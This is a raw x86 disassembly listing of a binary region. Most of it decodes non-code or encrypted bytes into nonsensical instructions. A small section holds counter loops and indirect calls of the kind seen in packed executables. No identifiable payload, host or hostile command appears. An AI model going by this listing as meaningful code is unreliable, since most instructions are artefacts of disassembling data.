  40a6fc:	popa   
  40a6fd:	xor    edx,DWORD PTR [ecx+0x1e]
  40a700:	pusha  
  40a701:	and    cl,BYTE PTR [ebx]
  40a703:	es out 0xe8,eax
  40a706:	das    
  40a707:	add    BYTE PTR [eax],ah
  40a709:	mov    ah,0x5c
  40a70b:	push   ds
  40a70c:	jb     0x40a6b2
  40a70e:	dec    ebp
  40a70f:	mov    eax,ds:0x73227522
  40a714:	int3   
  40a715:	mov    bl,0x3
  40a717:	mov    WORD PTR [eax+eax*4-0x3f],ss
  40a71b:	stc    
  40a71c:	mov    al,0xe2
  40a71e:	lods   al,BYTE PTR ds:[esi]
  40a71f:	mov    ebx,0x65112754
  40a724:	scas   al,BYTE PTR es:[edi]
  40a725:	popf   
  40a726:	dec    ebp
  40a727:	test   DWORD PTR [ecx-0xb67a258],ebx
  40a72d:	imul   esp,DWORD PTR [ebp+eax*8-0x9226a2f],0xeff86d91
  40a738:	mov    bh,BYTE PTR [ebp+0x7e]
  40a73b:	dec    edi
  40a73c:	stos   DWORD PTR es:[edi],eax
  40a73d:	std    
  40a73e:	out    0x8a,eax
  40a740:	pop    ss
  40a741:	loopne 0x40a720
  40a743:	push   esp
  40a744:	int    0xd
  40a746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a747:	and    BYTE PTR [ecx],bl
  40a749:	mov    eax,DWORD PTR [ecx+0x59]
  40a74c:	aas    
  40a74d:	and    dl,BYTE PTR [ecx]
  40a74f:	cmc    
  40a750:	or     bl,BYTE PTR [eax+0x65ef2855]
  40a756:	in     al,0x46
  40a758:	xchg   ebp,eax
  40a759:	mov    esp,0xc134e318
  40a75e:	mov    ch,0xfa
  40a760:	push   0x9718ea00
  40a765:	and    ax,0x62fc
  40a769:	mov    bh,0xa4
  40a76b:	jns    0x40a7d2
  40a76d:	jnp    0x40a75b
  40a76f:	mov    dh,BYTE PTR [ebx-0x1dc2f735]
  40a775:	loopne 0x40a78c
  40a777:	lods   eax,DWORD PTR ds:[esi]
  40a778:	adc    DWORD PTR [edi-0x8],esi
  40a77b:	das    
  40a77c:	call   0x8d56:0x6de66548
  40a783:	cmp    eax,0x28c76659
  40a788:	dec    esp
  40a789:	push   0xffffffd6
  40a78b:	mov    ax,0x5db0
  40a78f:	(bad)  
  40a791:	test   eax,edx
  40a793:	mov    bl,0x1a
  40a795:	test   al,0xc0
  40a797:	sahf   
  40a798:	add    al,0x63
  40a79a:	pop    eax
  40a79b:	fsubrp st(6),st
  40a79d:	fs inc ebp
  40a79f:	pop    edx
  40a7a0:	push   esi
  40a7a1:	xchg   BYTE PTR [edx+0x24],bl
  40a7a4:	inc    edx
  40a7a5:	cmp    edi,eax
  40a7a7:	mov    eax,0x3cd64055
  40a7ac:	fmul   QWORD PTR [eax]
  40a7ae:	icebp  
  40a7af:	push   es
  40a7b0:	pop    ebx
  40a7b1:	(bad)  
  40a7b2:	jecxz  0x40a77d
  40a7b4:	pop    es
  40a7b5:	cmp    BYTE PTR [edx+ebx*8+0x76b61e13],al
  40a7bc:	xchg   edx,eax
  40a7bd:	push   ds
  40a7be:	div    BYTE PTR [ebx]
  40a7c0:	inc    eax
  40a7c1:	cmp    eax,0xda2e589b
  40a7c6:	add    al,0x64
  40a7c8:	mov    ecx,0xce2fbf10
  40a7cd:	icebp  
  40a7ce:	jb     0x40a845
  40a7d0:	leave  
  40a7d1:	into   
  40a7d2:	xchg   ebp,eax
  40a7d3:	clc    
  40a7d4:	scas   eax,DWORD PTR es:[edi]
  40a7d5:	sbb    eax,edx
  40a7d7:	stc    
  40a7d8:	mov    ebx,0x7f164035
  40a7dd:	jmp    0xe2ef:0x9034622
  40a7e4:	and    DWORD PTR [edi+ebp*2],eax
  40a7e7:	dec    ebx
  40a7e8:	pop    ss
  40a7e9:	sub    eax,0xae89acf8
  40a7ee:	out    dx,al
  40a7ef:	or     al,cl
  40a7f1:	mov    dh,BYTE PTR [eax]
  40a7f3:	sahf   
  40a7f4:	aad    0x3
  40a7f6:	call   0x48a7:0x6b8fcc13
  40a7fd:	mov    edi,0xf6bc5614
  40a802:	div    DWORD PTR [esp+edi*8+0x1f]
  40a806:	mov    bl,0x1c
  40a808:	fucom  st(6)
  40a80a:	and    eax,0x78baf01c
  40a80f:	pop    eax
  40a810:	in     al,dx
  40a811:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a812:	pop    edx
  40a813:	mov    ch,0xd6
  40a815:	xor    DWORD PTR [eax+0x28],0x33
  40a819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a81a:	add    ebp,DWORD PTR [edi+ecx*2]
  40a81d:	add    al,al
  40a81f:	push   ss
  40a820:	sub    edx,DWORD PTR [edx+edi*4]
  40a823:	mov    ah,0x41
  40a825:	cdq    
  40a826:	mov    BYTE PTR [edx+0x4e0905fa],al
  40a82c:	outs   dx,BYTE PTR ds:[esi]
  40a82d:	mov    cl,0x4f
  40a82f:	data16 (bad) 
  40a831:	jl     0x40a7e8
  40a833:	xchg   DWORD PTR [esi],ecx
  40a835:	fwait
  40a836:	inc    esp
  40a837:	and    eax,0x2aa2584d
  40a83c:	inc    esi
  40a83d:	call   FWORD PTR [edi+0x67ebd43a]
  40a843:	fwait
  40a844:	adc    DWORD PTR [ebp+ebp*2-0x4540378a],ebp
  40a84b:	mov    cl,BYTE PTR [di-0x17bb]
  40a850:	mov    DWORD PTR [ebp-0x24],eax
  40a853:	xor    DWORD PTR ds:0x43045d,0x5f13
  40a85d:	mov    eax,DWORD PTR [ebp-0x18]
  40a860:	and    DWORD PTR ds:0x430469,0x0
  40a86a:	jmp    0x40a87c
  40a86f:	mov    ebx,DWORD PTR ds:0x430469
  40a875:	inc    ebx
  40a876:	mov    DWORD PTR ds:0x430469,ebx
  40a87c:	cmp    DWORD PTR ds:0x430469,0x10
  40a883:	jae    0x40a8ac
  40a889:	cmp    DWORD PTR ds:0x430469,0x13
  40a890:	jne    0x40a8a1
  40a896:	push   0x42e8fb
  40a89b:	call   DWORD PTR ds:0x42ec3f
  40a8a1:	jmp    0x40a86f
  40a8a6:	and    DWORD PTR ds:0x430465,edx
  40a8ac:	mov    ecx,DWORD PTR [ebp-0x24]
  40a8af:	xor    eax,esi
  40a8b1:	add    DWORD PTR ds:0x4304eb,0x2a87
  40a8bb:	add    eax,edi
  40a8bd:	sub    ebx,DWORD PTR ds:0x43046d
  40a8c3:	mov    DWORD PTR [ecx],eax
  40a8c5:	and    DWORD PTR ds:0x42e7d4,0x0
  40a8cf:	jmp    0x40a8e1
  40a8d4:	mov    ebx,DWORD PTR ds:0x42e7d4
  40a8da:	inc    ebx
  40a8db:	mov    DWORD PTR ds:0x42e7d4,ebx
  40a8e1:	cmp    DWORD PTR ds:0x42e7d4,0x1d
  40a8e8:	jae    0x40ac77
  40a8ee:	cmp    DWORD PTR ds:0x42e7d4,0x11
  40a8f5:	jne    0x40a90b
  40a8fb:	push   0x2475
  40a900:	push   0x8142
  40a905:	call   DWORD PTR ds:0x42ea07
  40a90b:	cmp    DWORD PTR ds:0x42e7d4,0x10
  40a912:	jne    0x40a925
  40a918:	mov    ebx,DWORD PTR ds:0x42e7d4
  40a91e:	inc    ebx
  40a91f:	mov    DWORD PTR ds:0x42e7d4,ebx
  40a925:	jmp    0x40a8d4
  40a92a:	jmp    0x40ac77
  40a92f:	fsubr  QWORD PTR [esi-0x17]
  40a932:	or     eax,0x6fd88969
  40a937:	pop    eax
  40a938:	or     BYTE PTR [edx-0x13e16887],bl
  40a93e:	add    bl,BYTE PTR [ecx+0x2e7e7ee1]
  40a944:	jge    0x40a9c4
  40a946:	jle    0x40a973
  40a948:	test   DWORD PTR [ecx-0x1feaf508],eax
  40a94e:	mov    ds:0x5209c7f5,al
  40a953:	fild   DWORD PTR [esi-0x71ea23c2]
  40a959:	jle    0x40a994
  40a95b:	ror    DWORD PTR [edx+0x182f8415],0xad
  40a962:	sahf   
  40a963:	xor    DWORD PTR [ebp-0x1045e1fc],0x941fddc4
  40a96d:	std    
  40a96e:	push   0x83383633
  40a973:	dec    eax
  40a974:	sub    BYTE PTR ds:0x466992b1,0x3e
  40a97b:	sti    
  40a97c:	inc    ebx
  40a97d:	dec    esp
  40a97e:	adc    ebx,DWORD PTR [ebp+0x285339ab]
  40a984:	jb     0x40a94e
  40a986:	pop    esp
  40a987:	out    dx,eax
  40a988:	pop    es
  40a989:	add    ecx,DWORD PTR [ecx]
  40a98b:	scas   al,BYTE PTR es:[edi]
  40a98c:	dec    edi
  40a98d:	lods   eax,DWORD PTR ds:[esi]
  40a98e:	shr    BYTE PTR ds:0xe37b0154,cl
  40a994:	outs   dx,BYTE PTR ds:[esi]
  40a995:	fldcw  WORD PTR [edx-0x2e]
  40a998:	loopne 0x40a9f1
  40a99a:	aam    0x84
  40a99c:	mov    esp,0x90574ea6
  40a9a1:	push   ds
  40a9a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9a4:	pop    ebx
  40a9a5:	xor    al,0x84
  40a9a7:	mov    edx,0x23b143af
  40a9ac:	out    dx,al
  40a9ad:	hlt    
  40a9ae:	or     ebp,DWORD PTR [esi]
  40a9b0:	mov    WORD PTR [edi],ds
  40a9b2:	jns    0x40a97e
  40a9b4:	loope  0x40a995
  40a9b6:	mov    ah,0x23
  40a9b8:	push   esp
  40a9b9:	mov    ebp,0x82d80c78
  40a9be:	dec    edi
  40a9bf:	data16 in al,0xae
  40a9c2:	add    edi,DWORD PTR [esi+0x36]
  40a9c5:	mov    eax,0xdaa6efe1
  40a9ca:	mov    esp,0xf10ce530
  40a9cf:	ss cs jge 0x40a9aa
  40a9d3:	cmc    
  40a9d4:	push   0xffffffc8
  40a9d6:	or     al,0x27
  40a9d8:	(bad)
  40a9dc:	jo     0x40a999
  40a9de:	cli    
  40a9df:	and    eax,ebx
  40a9e1:	out    dx,al
  40a9e2:	hlt    
  40a9e3:	jmp    0xa8589ce5
  40a9e8:	sbb    ecx,DWORD PTR [esi+eax*8]
  40a9eb:	push   esp
  40a9ec:	out    0x20,al
  40a9ee:	iret   
  40a9ef:	(bad)  
  40a9f0:	scas   al,BYTE PTR es:[edi]
  40a9f1:	fidiv  WORD PTR [edx+0x25]
  40a9f4:	out    dx,eax
  40a9f5:	cmp    DWORD PTR [ebx-0x24b96f9a],eax
  40a9fb:	icebp  
  40a9fc:	xchg   esp,eax
  40a9fd:	or     eax,0x9d30c553
  40aa02:	fisub  WORD PTR [ecx]
  40aa04:	xor    edx,DWORD PTR [ecx-0x72dfd11a]
  40aa0a:	pop    ds
  40aa0b:	mov    BYTE PTR [esi],bh
  40aa0d:	mov    ds:0x841db5e6,al
  40aa12:	in     al,0x7c
  40aa14:	mov    bl,BYTE PTR ds:0x16e545dd
  40aa1a:	in     eax,dx
  40aa1b:	push   ebx
  40aa1c:	nop
  40aa1d:	test   eax,0x424cf447
  40aa22:	fincstp 
  40aa24:	pop    esi
  40aa25:	adc    al,0x83
  40aa27:	lock cld 
  40aa29:	push   edx
  40aa2a:	pushf  
  40aa2b:	sbb    eax,0x8a8d136a
  40aa30:	mov    dh,BYTE PTR [edx+0x5e]
  40aa33:	xor    eax,0xd79c443e
  40aa38:	fldcw  WORD PTR [ebx-0x64544685]
  40aa3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa3f:	in     eax,dx
  40aa40:	jle    0x40aa3d
  40aa42:	out    dx,eax
  40aa43:	push   ebx
  40aa44:	sub    eax,0x56fa6510
  40aa49:	push   edi
  40aa4a:	mov    esi,0x3abf9426
  40aa4f:	leave  
  40aa50:	add    DWORD PTR [ebp-0x2b],esp
  40aa53:	jno    0x40aaa6
  40aa55:	mov    edi,0x5dd4797e
  40aa5a:	or     eax,0x416c6a82
  40aa5f:	add    dh,BYTE PTR [ebp-0x6d]
  40aa62:	jmp    0xe339:0xab80aa82
  40aa69:	cmp    bl,al
  40aa6b:	xchg   ebp,eax
  40aa6c:	fucomp st(0)
  40aa6e:	les    ecx,FWORD PTR [ecx-0x4ffbc14e]
  40aa74:	sbb    al,0x6b
  40aa76:	dec    ebp
  40aa77:	loop   0x40aa3e
  40aa79:	(bad)
  40aa7c:	cmp    eax,0x7fc0f8bd
  40aa81:	xor    BYTE PTR [eax+edi*4+0x175c7164],bh
  40aa88:	or     ecx,DWORD PTR [ebx+0x69000dcd]
  40aa8e:	js     0x40aa49
  40aa90:	or     BYTE PTR [eax+0x202c1e54],cl
  40aa96:	leave  
  40aa97:	enter  0x4957,0xfc
  40aa9b:	pop    ebp
  40aa9c:	(bad)  
  40aa9d:	jmp    0x40aadd
  40aa9f:	inc    edx
  40aaa0:	jne    0x40aa81
  40aaa2:	sahf   
  40aaa3:	js     0x40aa90
  40aaa5:	test   al,0xaf
  40aaa7:	out    dx,al
  40aaa8:	adc    DWORD PTR [esi+ebp*1+0x4f],eax
  40aaac:	adc    bh,BYTE PTR [esi+ebx*8]
  40aaaf:	sbb    BYTE PTR [edi+0x6],bh
  40aab2:	jbe    0x40aa7c
  40aab4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aab5:	rol    BYTE PTR [edi+0x47c6020f],1
  40aabb:	pop    edi
  40aabc:	mov    ebx,ebx
  40aabe:	adc    al,0xf3
  40aac0:	xor    ch,dl
  40aac2:	ja     0x40aa72
  40aac4:	jns    0x40aa8b
  40aac6:	mov    ah,0x26
  40aac8:	push   esi
  40aac9:	push   edx
  40aaca:	pop    es
  40aacb:	mov    edi,0x5d55c4a1
  40aad0:	retf   
  40aad1:	repnz int3 
  40aad3:	cmc    
  40aad4:	in     al,dx
  40aad5:	mov    ebx,0xf092281a
  40aada:	mov    ch,0x19
  40aadc:	in     al,0xd4
  40aade:	push   ds
  40aadf:	rcr    DWORD PTR [ebx+eiz*8+0x66],cl
  40aae3:	adc    dl,BYTE PTR [ecx-0x27]
  40aae6:	push   0xc0fc1c81
  40aaeb:	adc    BYTE PTR [ecx+0x6],al
  40aaee:	les    ebx,FWORD PTR [ebp+0xf]
  40aaf1:	xchg   esp,eax
  40aaf2:	fcom   DWORD PTR [eax-0x2d27e6d4]
  40aaf8:	lock xchg ebp,eax
  40aafa:	jl     0x40ab4c
  40aafc:	inc    eax
  40aafd:	dec    esi
  40aafe:	dec    esi
  40aaff:	popa   
  40ab00:	fcom   st(5)
  40ab02:	xor    al,0xd7
  40ab04:	fisub  DWORD PTR [ecx+0x632f56cc]
  40ab0a:	arpl   bx,sp
  40ab0c:	add    BYTE PTR [ebx-0x49],0xd2
  40ab10:	or     esi,ecx
  40ab12:	imul   ecx,DWORD PTR [edx-0x1b],0x1f
  40ab16:	les    eax,FWORD PTR [ebp+0x7e173c0a]
  40ab1c:	sahf   
  40ab1d:	add    ecx,ecx
  40ab1f:	cmp    BYTE PTR [eax-0x49],dh
  40ab22:	out    dx,eax
  40ab23:	push   eax
  40ab24:	icebp  
  40ab25:	shl    ebx,0xc6
  40ab28:	adc    bh,BYTE PTR [eax]
  40ab2a:	push   ecx
  40ab2b:	ins    BYTE PTR es:[edi],dx
  40ab2c:	arpl   WORD PTR [edi+edi*2-0x75],ax
  40ab30:	addr16 jmp 0x40ab33
  40ab33:	(bad)  
  40ab34:	pop    esi
  40ab35:	retf   
  40ab36:	ja     0x40aad8
  40ab38:	xor    al,0xe4
  40ab3a:	ins    BYTE PTR es:[edi],dx
  40ab3b:	sub    DWORD PTR [ebp-0x38],esp
  40ab3e:	shr    ah,cl
  40ab40:	add    cl,BYTE PTR [edx+0x31]
  40ab43:	cwde   
  40ab44:	mov    dh,0x5d
  40ab46:	stc    
  40ab47:	ss jge 0x40ab93
  40ab4a:	(bad)  
  40ab4b:	mov    ah,0x76
  40ab4d:	jge    0x40ab10
  40ab4f:	mov    eax,0x8af406c7
  40ab54:	iret   
  40ab55:	iret   
  40ab56:	cmp    al,0xb5
  40ab58:	cmp    al,0x76
  40ab5a:	sbb    al,0x93
  40ab5c:	sub    BYTE PTR [edx],ch
  40ab5e:	mov    ds:0xd0137604,eax
  40ab63:	jns    0x40ab4c
  40ab65:	bound  ecx,QWORD PTR [ecx]
  40ab67:	add    eax,0xda10ef57
  40ab6c:	(bad)
  40ab6f:	xchg   ebx,esi
  40ab71:	fistp  QWORD PTR [edx-0x5b8399d9]
  40ab77:	mov    cl,0xe6
  40ab79:	adc    eax,0x90bd8c2
  40ab7e:	lock or al,0x24
  40ab81:	cmp    al,0xcb
  40ab83:	inc    ecx
  40ab84:	gs dec esp
  40ab86:	out    0x5c,al
  40ab88:	xor    BYTE PTR [ebp+0x48ff2cce],0xd1
  40ab8f:	pop    esp
  40ab90:	daa    
  40ab91:	jge    0x40ab7c
  40ab93:	aaa    
  40ab94:	in     al,0x1
  40ab96:	gs je  0x40abb7
  40ab99:	add    eax,0x4d64adc4
  40ab9e:	daa    
  40ab9f:	gs (bad) 
  40aba1:	xlat   BYTE PTR ds:[ebx]
  40aba2:	jp     0x40ab3c
  40aba4:	arpl   WORD PTR [esi+0x15e7d4c6],bx
  40abaa:	sub    al,0xb1
  40abac:	(bad)  
  40abad:	frstor [edx]
  40abaf:	push   eax
  40abb0:	hlt    
  40abb1:	mov    ds:0x589d9298,al
  40abb6:	rcl    ebx,1
  40abb8:	retf   
  40abb9:	mov    ah,0xf
  40abbb:	pop    es
  40abbc:	pop    ebx
  40abbd:	ins    DWORD PTR es:[edi],dx
  40abbe:	push   ecx
  40abbf:	xchg   esp,eax
  40abc0:	sbb    BYTE PTR [ecx-0x1943fbb7],0x4b
  40abc7:	jmp    0x85d18ca5
  40abcc:	and    DWORD PTR [esp+ecx*1+0x8efb72d],0x8b1867d4
  40abd7:	pop    edi
  40abd8:	push   ds
  40abd9:	je     0x40ab5c
  40abdb:	mov    bl,0x5d
  40abdd:	imul   edx,DWORD PTR [ebp-0x29468a3a],0x11
  40abe4:	jecxz  0x40ab88
  40abe6:	imul   esp,DWORD PTR [esp+eiz*4-0x3d],0x7f
  40abeb:	mov    dh,0x30
  40abed:	mov    ebx,0x8a0741af
  40abf2:	ja     0x40abf6
  40abf4:	pop    edx
  40abf5:	jae    0x40ab99
  40abf7:	ret    0x1644
  40abfa:	je     0x40abd2
  40abfc:	xchg   edx,eax
  40abfd:	es je  0x40abd1
  40ac00:	mov    ecx,0x649ed4de
  40ac05:	sub    dh,bh
  40ac07:	xor    bl,BYTE PTR [eax-0x5e35d7c2]
  40ac0d:	mov    al,ds:0x8d1ee44b
  40ac12:	push   ds
  40ac13:	or     esp,ebp
  40ac15:	add    DWORD PTR [ebp+0x62],ecx
  40ac18:	in     al,0x40
  40ac1a:	jno    0x40ac7a
  40ac1c:	sti    
  40ac1d:	fidiv  DWORD PTR [edx]
  40ac1f:	stos   BYTE PTR es:[edi],al
  40ac20:	inc    eax
  40ac21:	jne    0x40ac78
  40ac23:	pop    esp
  40ac24:	ficomp WORD PTR [ebx]
  40ac26:	and    eax,0x23eff8f4
  40ac2b:	in     eax,dx
  40ac2c:	mov    bh,BYTE PTR [esi+ecx*2-0x4d1798]
  40ac33:	mov    ?,WORD PTR [edx-0x58299aa3]
  40ac39:	(bad)  
  40ac3a:	xor    ah,BYTE PTR [edx+0x64]
  40ac3d:	inc    ecx
  40ac3e:	neg    edx
  40ac40:	pop    eax
  40ac41:	adc    BYTE PTR ds:0x7df92688,bl
  40ac47:	psubd  mm1,QWORD PTR [ebp+0x61103137]
  40ac4e:	lahf   
  40ac4f:	pusha  
  40ac50:	rcl    BYTE PTR [edx+0x5d],cl
  40ac53:	xlat   BYTE PTR ds:[ebx]
  40ac54:	dec    edx
  40ac55:	push   es
  40ac56:	ret    
  40ac57:	retf   0x31e3
  40ac5a:	mov    ebp,0xa2574af6
  40ac5f:	rol    BYTE PTR [ebp+0x360afae5],0xf4
  40ac66:	inc    ebp
  40ac67:	stos   DWORD PTR es:[edi],eax
  40ac68:	add    dh,BYTE PTR [eax-0x34]
  40ac6b:	push   ebp
  40ac6c:	jnp    0x40ac41
  40ac6e:	inc    esi
  40ac6f:	lock xchg esp,eax
  40ac71:	mov    es,WORD PTR [eax-0x648d744b]
  40ac77:	mov    eax,ds:0x41227c
  40ac7c:	mov    ebx,0x8e12feb8
  40ac81:	jmp    0x40afce
  40ac86:	leave  
  40ac87:	inc    edx
  40ac88:	mov    ebp,0xd1515553
  40ac8d:	inc    eax
  40ac8e:	xor    ch,ah
  40ac90:	icebp  
  40ac91:	pushf  
  40ac92:	into   
  40ac93:	pop    edx
  40ac94:	jnp    0x40ac7c
  40ac96:	dec    ecx
  40ac97:	in     al,dx
  40ac98:	jle    0x40ad18
  40ac9a:	cs jge 0x40ad1b
  40ac9d:	jle    0x40ac59
  40ac9f:	nop
  40aca0:	push   es
  40aca1:	adc    BYTE PTR [eax+ecx*4],ah
  40aca4:	adc    dh,BYTE PTR [esi]
  40aca6:	jbe    0x40ac5a
  40aca8:	and    DWORD PTR [edx+0x2c5fdfc7],ebx
  40acae:	fcmovne st,st(5)
  40acb0:	and    al,0x31
  40acb2:	mov    esi,0xb4471bf6
  40acb7:	inc    ecx
  40acb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acb9:	push   ebp
  40acba:	daa    
  40acbb:	adc    eax,0xf9e309c8
  40acc0:	inc    edi
  40acc1:	xor    al,0x7
  40acc3:	outs   dx,BYTE PTR ds:[esi]
  40acc4:	or     dl,dh
  40acc6:	dec    edx
  40acc7:	fsub   st(3),st
  40acc9:	sti    
  40acca:	xchg   edi,eax
  40accb:	jb     0x40ac85
  40accd:	ret    0x1a28
  40acd0:	push   0x8e731708
  40acd5:	lahf   
  40acd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acd7:	(bad)  
  40acd8:	fmul   st,st(4)
  40acda:	out    dx,al
  40acdb:	cmp    ecx,eax
  40acdd:	(bad)  
  40acde:	shl    BYTE PTR [esi],0xf4
  40ace1:	inc    ebp
  40ace2:	enter  0x2800,0x4
  40ace6:	inc    DWORD PTR [ebx+edi*4+0x42]
  40acea:	dec    ebp
  40aceb:	pop    esi
  40acec:	lahf   
  40aced:	sub    BYTE PTR [ecx-0x96c51c7],al
  40acf3:	out    0x8b,eax
  40acf5:	mov    bh,0xb9
  40acf7:	popf   
  40acf8:	ja     0x40ad5c
  40acfa:	mov    bh,0x3f
  40acfc:	imul   eax,DWORD PTR [edi+0x41d22de5],0x7b97dc79
  40ad06:	ret    
  40ad07:	ret    0xae35
  40ad0a:	test   al,0xf8
  40ad0c:	xchg   esp,eax
  40ad0d:	xor    ebx,DWORD PTR [edx+0x55]
  40ad10:	hlt    
  40ad11:	es rol bh,1
  40ad14:	je     0x40ad26
  40ad16:	and    di,WORD PTR [eax+ebx*4+0x4a]
  40ad1b:	add    eax,0x78f4061c
  40ad20:	(bad)  
  40ad21:	dec    ebp
  40ad22:	jb     0x40ad2d
  40ad24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad25:	ins    DWORD PTR es:[edi],dx
  40ad26:	and    edi,eax
  40ad28:	push   ebp
  40ad29:	inc    edx
  40ad2a:	add    bl,BYTE PTR [eax+0x50]
  40ad2d:	cmp    al,BYTE PTR [ebp+0x2ccb6320]
  40ad33:	repnz imul esi,edi,0xcc28df0a
  40ad3a:	(bad)  
  40ad3b:	or     DWORD PTR [eax-0x6b],eax
  40ad3e:	cmp    esi,esi
  40ad40:	xor    BYTE PTR [edi-0x512855a4],dh
  40ad46:	retf   0xa9aa
  40ad49:	popa   
  40ad4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad4b:	xchg   BYTE PTR [eax],bl
  40ad4d:	call   0x44a41ec2
  40ad52:	sbb    edi,DWORD PTR [edi]
  40ad54:	mov    dl,0x3f
  40ad56:	pop    ss
  40ad57:	loopne 0x40ad49
  40ad59:	inc    BYTE PTR [esi]
  40ad5b:	js     0x40ad0f
  40ad5d:	call   0x4a10:0x9d045a72
  40ad64:	shl    DWORD PTR [ebp+0x433a8451],1
  40ad6a:	jno    0x40ad18
  40ad6c:	retf   
  40ad6d:	sub    al,0x7a
  40ad6f:	shl    BYTE PTR [ebp-0x18],1
  40ad72:	retf   0x9d9c
  40ad75:	jge    0x40add9
  40ad77:	out    dx,al
  40ad78:	adc    BYTE PTR [ebx+0x65],ah
  40ad7b:	pop    esp
  40ad7c:	jb     0x40ad32
  40ad7e:	jae    0x40ad0a
  40ad80:	enter  0xb729,0x28
  40ad84:	mov    edx,0xf12bcc2d
  40ad89:	mov    eax,0xab6a7600
  40ad8e:	push   ebx
  40ad8f:	jmp    0xf2d81493
  40ad94:	or     esi,DWORD PTR [eax+0x4432ddbc]
  40ad9a:	retf   
  40ad9b:	lea    ebx,[edi-0x14]
  40ad9e:	mov    ebp,0x740831b7
  40ada3:	adc    al,0x3c
  40ada5:	push   edx
  40ada6:	in     al,0x6d
  40ada8:	fdiv   DWORD PTR [edi+edx*4+0x27]
  40adac:	ror    BYTE PTR [ebx+edi*1-0x3eb35f7b],0xf1
  40adb4:	int3   
  40adb5:	mov    ah,0x5f
  40adb7:	sub    al,0xbd
  40adb9:	or     dl,bl
  40adbb:	jg     0x40ad63
  40adbd:	idiv   dh
  40adbf:	nop
  40adc0:	dec    ecx
  40adc1:	or     DWORD PTR [edi+eiz*2-0x17],esi
  40adc5:	or     ch,BYTE PTR [esi+0x3ba77e7d]
  40adcb:	cmp    DWORD PTR [edi],ebp
  40adcd:	mov    esi,0xdc2485dc
  40add2:	inc    edi
  40add3:	faddp  st(6),st
  40add5:	mov    al,0x4a
  40add7:	(bad)  
  40add8:	fadd   QWORD PTR [eax-0x3fafda3e]
  40adde:	or     esi,DWORD PTR [ebx+0x6e]
  40ade1:	mov    bl,0x8
  40ade3:	nop
  40ade4:	icebp  
  40ade5:	out    0x4e,al
  40ade7:	out    0xc9,al
  40ade9:	sub    BYTE PTR [ebx],dh
  40adeb:	repz mov dl,0xa1
  40adee:	dec    ebx
  40adef:	out    0x5d,al
  40adf1:	in     eax,0x22
  40adf3:	imul   ecx,edi,0x7f28f3d5
  40adf9:	or     eax,0x48127864
  40adfe:	mov    bh,0xdc
  40ae00:	jmp    0x40ae14
  40ae02:	mov    DWORD PTR [eax-0x80],eax
  40ae05:	xor    esi,DWORD PTR ds:0xa4787448
  40ae0b:	cmp    al,0x69
  40ae0d:	js     0x40ae8d
  40ae0f:	in     eax,0xe6
  40ae11:	inc    edi
  40ae12:	(bad)  
  40ae13:	or     BYTE PTR [ebx+0x50148b43],bl
  40ae19:	sbb    eax,DWORD PTR [edx+ebp*2+0x12]
  40ae1d:	jae    0x40adc2
  40ae1f:	mov    edx,0x3550b6a
  40ae24:	leave  
  40ae25:	cmp    eax,0xcc9a0562
  40ae2a:	mov    ebx,DWORD PTR [ebp+0x64]
  40ae2d:	mov    edi,0xd45adde
  40ae32:	jge    0x40adc0
  40ae34:	sbb    eax,0x33308ef7
  40ae39:	ins    BYTE PTR es:[edi],dx
  40ae3a:	(bad)  
  40ae3b:	ficom  WORD PTR [ebp-0x50]
  40ae3e:	dec    ecx
  40ae3f:	mov    edx,0x83bde025
  40ae44:	enter  0xac8,0x2
  40ae48:	call   0x8e498e9c
  40ae4d:	jne    0x40ae1d
  40ae4f:	pop    esi
  40ae50:	dec    esp
  40ae51:	cmp    al,0xec
  40ae53:	cdq    
  40ae54:	push   ebp
  40ae55:	and    ah,BYTE PTR cs:[esp+ebx*2-0x13f682ec]
  40ae5d:	ret    0xdafd
  40ae60:	jbe    0x40ae0b
  40ae62:	jns    0x40ae4a
  40ae64:	mov    esi,0x2cbf6de0
  40ae69:	mov    ?,WORD PTR [edi+0x634ce741]
  40ae6f:	mov    ah,0x60
  40ae71:	les    esi,FWORD PTR [edx-0x40debcd9]
  40ae77:	inc    esp
  40ae78:	pop    eax
  40ae79:	stc    
  40ae7a:	cs das 
  40ae7c:	xor    BYTE PTR [edx-0x3],bh
  40ae7f:	push   ds
  40ae80:	popfw  
  40ae82:	add    ebx,esp
  40ae84:	dec    edi
  40ae85:	lods   eax,DWORD PTR ds:[esi]
  40ae86:	iret   
  40ae87:	out    dx,eax
  40ae88:	loop   0x40ae30
  40ae8a:	cmc    
  40ae8b:	xchg   ebx,eax
  40ae8c:	mov    ecx,0x9c35656d
  40ae91:	sub    BYTE PTR [ebp+0x3f6066e7],cl
  40ae97:	dec    edx
  40ae98:	xchg   edx,eax
  40ae99:	ja     0x40ae8e
  40ae9b:	add    BYTE PTR ds:[edi],bh
  40ae9e:	(bad)  
  40aea0:	scas   eax,DWORD PTR es:[edi]
  40aea1:	mov    di,0xccaa
  40aea5:	stc    
  40aea6:	sbb    ch,dl
  40aea8:	sub    BYTE PTR [edx-0x23acbe09],dh
  40aeae:	xlat   BYTE PTR ds:[ebx]
  40aeaf:	xchg   edi,eax
  40aeb0:	jnp    0x40ae66
  40aeb2:	inc    ecx
  40aeb3:	add    al,0xab
  40aeb5:	call   0x72ca192e
  40aeba:	xlat   BYTE PTR ds:[ebx]
  40aebb:	xor    ah,BYTE PTR [esi+0x15035ef0]
  40aec1:	(bad)  
  40aec2:	cmp    ch,ch
  40aec4:	xchg   esi,eax
  40aec5:	cmp    cl,al
  40aec7:	popf   
  40aec8:	add    dl,BYTE PTR [edi]
  40aeca:	xchg   DWORD PTR [edi+0x60],esi
  40aecd:	dec    esp
  40aece:	dec    esp
  40aecf:	pop    eax
  40aed0:	aas    
  40aed1:	hlt    
  40aed2:	pop    edx
  40aed3:	dec    ebp
  40aed4:	mov    ebp,0x9ec77640
  40aed9:	ds pop edx
  40aedb:	mov    cl,0xd0
  40aedd:	mov    bh,0x8c
